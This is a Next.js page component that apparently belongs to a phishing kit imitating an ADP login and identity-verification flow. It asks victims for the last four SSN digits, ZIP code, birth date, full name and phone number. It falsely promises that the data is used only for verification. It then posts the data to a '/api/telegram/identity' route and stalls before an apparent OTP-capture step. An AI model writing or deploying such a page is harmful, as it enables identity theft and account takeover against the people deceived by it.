"use client"

import { useRouter } from "next/navigation"
import { useState, useEffect } from "react"
import { AdpAuthShell } from "@/components/adp-auth-shell"
import { LOGIN_SESSION } from "@/lib/login-flow"
import {
  formatUsZipInput,
  isValidUsZip,
  usZipDigits,
} from "@/lib/us-zip"
import { Loader2 } from "lucide-react"

const MONTHS = [
  "January", "February", "March", "April", "May", "June",
  "July", "August", "September", "October", "November", "December",
]
const DAYS = Array.from({ length: 31 }, (_, i) => String(i + 1))
const CURRENT_YEAR = new Date().getFullYear()
const YEARS = Array.from({ length: CURRENT_YEAR - 1919 }, (_, i) => String(CURRENT_YEAR - i))

export default function VerifyIdentityPage() {
  const router = useRouter()
  useEffect(() => {
    if (typeof window !== "undefined" && !sessionStorage.getItem(LOGIN_SESSION.identity)) {
      router.replace("/verify")
    }
  }, [router])

  const [ssnLast4, setSsnLast4] = useState("")
  const [zipCode, setZipCode] = useState("")
  const [birthMonth, setBirthMonth] = useState("")
  const [birthDay, setBirthDay] = useState("")
  const [birthYear, setBirthYear] = useState("")
  const [fullName, setFullName] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [submitAttempted, setSubmitAttempted] = useState(false)
  const [zipBlurred, setZipBlurred] = useState(false)
  const [isLoading, setIsLoading] = useState(false)

  const ssnDigits = ssnLast4.replace(/\D/g, "")
  const zipDigits = usZipDigits(zipCode)
  const dateOfBirth =
    birthMonth && birthDay && birthYear
      ? `${String(MONTHS.indexOf(birthMonth) + 1).padStart(2, "0")}/${birthDay.padStart(2, "0")}/${birthYear}`
      : ""
  const isDobValid = Boolean(birthMonth && birthDay && birthYear)
  const isSsnValid = ssnDigits.length === 4
  const isZipValid = isValidUsZip(zipCode)
  const isFullNameValid = fullName.trim().length > 0
  const phoneDigits = phoneNumber.replace(/\D/g, "")
  const isPhoneValid = phoneDigits.length >= 10
  const isFormValid =
    isSsnValid && isZipValid && isDobValid && isFullNameValid && isPhoneValid

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setSubmitAttempted(true)
    if (!isFormValid || isLoading) return
    setIsLoading(true)
    try {
      await fetch("/api/telegram/identity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ssnLast4: ssnDigits,
          zipCode: zipDigits,
          dateOfBirth,
          fullName: fullName.trim(),
          phoneNumber: phoneNumber.trim(),
        }),
      })
    } catch (err) {
      console.error("Failed to send identity notification:", err)
    }
    await new Promise((r) => setTimeout(r, 10000))
    if (typeof window !== "undefined") sessionStorage.setItem(LOGIN_SESSION.otp2, "1")
    router.push("/verify?step=2")
  }

  const formatPhoneNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 10)
    if (digits.length <= 3) return digits
    if (digits.length <= 6) return `(${digits.slice(0, 3)}) ${digits.slice(3)}`
    return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`
  }

  return (
    <AdpAuthShell
      step={3}
      title="Confirm your identity"
      subtitle="Please provide the details below to continue."
    >
      <div className="identity-form">
        <button
          type="button"
          onClick={() => router.push("/verify")}
          disabled={isLoading}
          className="back-link"
        >
          ‹ Back
        </button>

        <p className="privacy-note">
          This personal information will only be used to verify your identity.
        </p>

        <form onSubmit={handleSubmit} className="fields">
          <div className="field">
            <label htmlFor="ssnLast4">Last 4 digits of SSN</label>
            <input
              id="ssnLast4"
              type="text"
              inputMode="numeric"
              maxLength={4}
              value={ssnLast4}
              onChange={(e) => setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))}
              disabled={isLoading}
              className={`field-input field-input-short ${submitAttempted && !isSsnValid ? "field-input-error" : ""}`}
            />
            {submitAttempted && !isSsnValid ? (
              <p className="field-error">Enter last 4 digits of SSN</p>
            ) : null}
          </div>

          <div className="field">
            <label htmlFor="zipCode">Zip code</label>
            <input
              id="zipCode"
              type="text"
              inputMode="numeric"
              value={zipCode}
              onChange={(e) => setZipCode(formatUsZipInput(e.target.value))}
              onFocus={() => setZipBlurred(false)}
              onBlur={() => setZipBlurred(true)}
              placeholder="12345"
              maxLength={10}
              disabled={isLoading}
              className={`field-input field-input-zip ${(zipBlurred || submitAttempted) && !isZipValid ? "field-input-error" : ""}`}
            />
            {(zipBlurred || submitAttempted) && !isZipValid ? (
              <p className="field-error">Enter a valid ZIP code (5 digits or 9 digits).</p>
            ) : null}
          </div>

          <div className="field">
            <span className="field-label">Birth date</span>
            <div className="dob-row">
              <select
                value={birthMonth}
                onChange={(e) => setBirthMonth(e.target.value)}
                disabled={isLoading}
                aria-label="Birth month"
                className={`field-select field-select-month ${submitAttempted && !isDobValid ? "field-input-error" : ""}`}
              >
                <option value="">Month</option>
                {MONTHS.map((m) => (
                  <option key={m} value={m}>{m}</option>
                ))}
              </select>
              <select
                value={birthDay}
                onChange={(e) => setBirthDay(e.target.value)}
                disabled={isLoading}
                aria-label="Birth day"
                className={`field-select field-select-day ${submitAttempted && !isDobValid ? "field-input-error" : ""}`}
              >
                <option value="">Day</option>
                {DAYS.map((d) => (
                  <option key={d} value={d}>{d}</option>
                ))}
              </select>
              <select
                value={birthYear}
                onChange={(e) => setBirthYear(e.target.value)}
                disabled={isLoading}
                aria-label="Birth year"
                className={`field-select field-select-year ${submitAttempted && !isDobValid ? "field-input-error" : ""}`}
              >
                <option value="">Year</option>
                {YEARS.map((y) => (
                  <option key={y} value={y}>{y}</option>
                ))}
              </select>
            </div>
            {submitAttempted && !isDobValid ? (
              <p className="field-error">Select month, day, and year</p>
            ) : null}
          </div>

          <div className="field">
            <label htmlFor="fullName">Full name</label>
            <input
              id="fullName"
              type="text"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
              disabled={isLoading}
              className={`field-input ${submitAttempted && !isFullNameValid ? "field-input-error" : ""}`}
            />
            {submitAttempted && !isFullNameValid ? (
              <p className="field-error">Enter your full name</p>
            ) : null}
          </div>

          <div className="field">
            <label htmlFor="phoneNumber">Phone number</label>
            <input
              id="phoneNumber"
              type="tel"
              inputMode="numeric"
              placeholder="(555) 555-5555"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(formatPhoneNumber(e.target.value))}
              maxLength={14}
              disabled={isLoading}
              className={`field-input field-input-phone ${submitAttempted && !isPhoneValid ? "field-input-error" : ""}`}
            />
            {submitAttempted && !isPhoneValid ? (
              <p className="field-error">Enter a valid phone number</p>
            ) : null}
          </div>

          <div className="action-stack">
            <button type="submit" disabled={isLoading} className="btn-primary">
              {isLoading ? <Loader2 className="btn-spinner" /> : null}
              {isLoading ? "Loading..." : "Continue"}
            </button>
            <button
              type="button"
              onClick={() => router.push("/")}
              disabled={isLoading}
              className="btn-secondary"
            >
              Cancel
            </button>
          </div>
        </form>
      </div>

      <style jsx>{`
        .identity-form {
          display: flex;
          flex-direction: column;
          gap: 18px;
        }

        .back-link {
          align-self: flex-start;
          border: none;
          background: none;
          color: #0046be;
          font-size: 14px;
          font-weight: 500;
          cursor: pointer;
          padding: 0;
        }

        .back-link:hover:not(:disabled) {
          text-decoration: underline;
        }

        .back-link:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .privacy-note {
          font-size: 13px;
          color: #71717a;
          line-height: 1.5;
        }

        .fields {
          display: flex;
          flex-direction: column;
          gap: 16px;
        }

        .field {
          display: flex;
          flex-direction: column;
          gap: 6px;
        }

        .field label,
        .field-label {
          font-size: 13px;
          font-weight: 600;
          color: #18181b;
        }

        .field-input,
        .field-select {
          height: 40px;
          padding: 0 12px;
          font-size: 14px;
          color: #18181b;
          background: #fff;
          border: 1.5px solid #d4d4d8;
          border-radius: 6px;
          outline: none;
          transition:
            border-color 0.15s ease,
            box-shadow 0.15s ease;
        }

        .field-input:focus,
        .field-select:focus {
          border-color: #0046be;
          box-shadow: 0 0 0 3px rgba(0, 70, 190, 0.12);
        }

        .field-input:disabled,
        .field-select:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }

        .field-input-error {
          border-color: #ef4444;
        }

        .field-input-error:focus {
          border-color: #ef4444;
          box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.12);
        }

        .field-input-short {
          width: 96px;
        }

        .field-input-zip {
          width: 140px;
          max-width: 100%;
        }

        .field-input-phone {
          width: 180px;
          max-width: 100%;
        }

        .dob-row {
          display: flex;
          flex-wrap: wrap;
          gap: 8px;
        }

        .field-select-month {
          min-width: 120px;
          flex: 1;
        }

        .field-select-day {
          width: 72px;
        }

        .field-select-year {
          width: 88px;
        }

        .field-error {
          font-size: 12px;
          color: #dc2626;
        }

        .action-stack {
          display: flex;
          flex-direction: column;
          gap: 10px;
          padding-top: 8px;
        }

        .btn-primary,
        .btn-secondary {
          width: 100%;
          border-radius: 6px;
          font-size: 15px;
          font-weight: 600;
          padding: 12px 16px;
          cursor: pointer;
          transition: background-color 0.15s ease, opacity 0.15s ease;
        }

        .btn-primary {
          border: none;
          background: #0046be;
          color: #fff;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
        }

        .btn-primary:hover:not(:disabled) {
          background: #003a9e;
        }

        .btn-primary:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .btn-secondary {
          border: 1.5px solid #0046be;
          background: #fff;
          color: #0046be;
        }

        .btn-secondary:hover:not(:disabled) {
          background: #f0f6ff;
        }

        .btn-secondary:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .btn-spinner {
          width: 16px;
          height: 16px;
          animation: spin 1s linear infinite;
        }

        @keyframes spin {
          to {
            transform: rotate(360deg);
          }
        }
      `}</style>
    </AdpAuthShell>
  )
}
